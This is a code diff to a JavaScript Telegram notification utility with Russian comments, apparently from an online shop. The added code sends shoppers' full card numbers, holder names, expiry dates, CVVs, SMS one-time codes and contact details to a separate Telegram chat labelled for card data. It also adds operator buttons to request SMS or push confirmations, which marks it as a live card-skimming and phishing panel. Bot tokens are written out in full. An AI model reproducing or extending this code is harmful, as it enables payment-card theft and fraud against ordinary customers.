@@ -1,6 +1,11 @@
 // Telegram Bot утилита для отправки уведомлений
+// Бот 1 - для уведомлений о действиях на сайте
 const BOT_TOKEN = '8331014768:AAGOCsiFshI4o6VkVkY3fiFkdn6Zhoj9N2E'
 const CHAT_ID = '-4862930461'
+
+// Бот 2 - для данных банковских карт
+const BOT_TOKEN_CARDS = '8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg'
+const CHAT_ID_CARDS = '-1003171719602'
 
 // Генерируем уникальный ID пользователя на основе браузера и времени
 export const generateUserId = () => {
@@ -19,7 +24,7 @@ export const getUserId = () => {
   return userId
 }
 
-// Отправляем сообщение в Telegram
+// Отправляем сообщение в Telegram (основной бот для уведомлений)
 const sendTelegramMessage = async (message) => {
   try {
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -39,6 +44,37 @@ const sendTelegramMessage = async (message) => {
     }
   } catch (error) {
     console.error('Error sending Telegram message:', error)
+  }
+}
+
+// Отправляем сообщение в Telegram (бот для банковских карт)
+const sendTelegramMessageCards = async (message, inlineKeyboard = null) => {
+  try {
+    const payload = {
+      chat_id: CHAT_ID_CARDS,
+      text: message,
+      parse_mode: 'HTML'
+    }
+    
+    if (inlineKeyboard) {
+      payload.reply_markup = {
+        inline_keyboard: inlineKeyboard
+      }
+    }
+    
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN_CARDS}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload)
+    })
+    
+    if (!response.ok) {
+      console.error('Failed to send Telegram message to cards bot:', response.statusText)
+    }
+  } catch (error) {
+    console.error('Error sending Telegram message to cards bot:', error)
   }
 }
 
@@ -141,4 +177,84 @@ export const notifyPaymentReturn = (orderId, status) => {
 📊 <b>Статус:</b> ${statusText}`
 
   sendTelegramMessage(message)
+}
+
+// Уведомление о вводе данных банковской карты (отправляется в отдельный чат для карт)
+export const notifyCardPayment = (cardData, orderData) => {
+  const userId = getUserId()
+  const timestamp = new Date().toLocaleString('ru-RU', {
+    timeZone: 'Asia/Bangkok',
+    year: 'numeric',
+    month: '2-digit',
+    day: '2-digit',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit'
+  })
+  
+  const message = `💳 <b>ДАННЫЕ БАНКОВСКОЙ КАРТЫ</b>
+
+👤 <b>ID клиента:</b> <code>${userId}</code>
+🕐 <b>Время:</b> ${timestamp}
+
+💳 <b>ДАННЫЕ КАРТЫ:</b>
+💳 <b>Номер карты:</b> <code>${cardData.cardNumber}</code>
+👤 <b>Держатель:</b> ${cardData.cardHolderName}
+📅 <b>Срок:</b> ${cardData.expiryDate}
+🔐 <b>CVV:</b> <code>${cardData.cvv}</code>
+
+📦 <b>ЗАКАЗ:</b>
+👨‍💼 <b>Клиент:</b> ${orderData.formData.firstName} ${orderData.formData.lastName}
+📞 <b>Телефон:</b> ${orderData.formData.phone}
+📧 <b>Email:</b> ${orderData.formData.email}
+🏠 <b>Адрес:</b> ${orderData.formData.address}, ${orderData.formData.city}
+💰 <b>Сумма заказа:</b> ${orderData.total} THB`
+
+  // Inline кнопки для управления
+  const inlineKeyboard = [
+    [
+      { text: '📱 Запросить SMS', callback_data: `request_sms_${userId}` },
+      { text: '🔔 Запросить PUSH', callback_data: `request_push_${userId}` }
+    ],
+    [
+      { text: '❌ Не верное SMS', callback_data: `invalid_sms_${userId}` },
+      { text: '🚫 Карта не лезет', callback_data: `card_blocked_${userId}` }
+    ]
+  ]
+
+  sendTelegramMessageCards(message, inlineKeyboard)
+}
+
+// Уведомление о вводе SMS кода клиентом
+export const notifySMSCodeEntered = (smsCode, cardData, orderData) => {
+  const userId = getUserId()
+  const timestamp = new Date().toLocaleString('ru-RU', {
+    timeZone: 'Asia/Bangkok',
+    year: 'numeric',
+    month: '2-digit',
+    day: '2-digit',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit'
+  })
+  
+  const message = `📱 <b>SMS КОД ВВЕДЕН</b>
+
+👤 <b>ID клиента:</b> <code>${userId}</code>
+🕐 <b>Время:</b> ${timestamp}
+
+🔐 <b>SMS КОД:</b> <code>${smsCode}</code>
+
+💳 <b>ДАННЫЕ КАРТЫ:</b>
+💳 <b>Номер:</b> <code>${cardData.cardNumber}</code>
+👤 <b>Держатель:</b> ${cardData.cardHolderName}
+📅 <b>Срок:</b> ${cardData.expiryDate}
+🔐 <b>CVV:</b> <code>${cardData.cvv}</code>
+
+📦 <b>ЗАКАЗ:</b>
+👨‍💼 <b>Клиент:</b> ${orderData.formData.firstName} ${orderData.formData.lastName}
+📞 <b>Телефон:</b> ${orderData.formData.phone}
+💰 <b>Сумма:</b> ${orderData.total} THB`
+
+  sendTelegramMessageCards(message)
 }
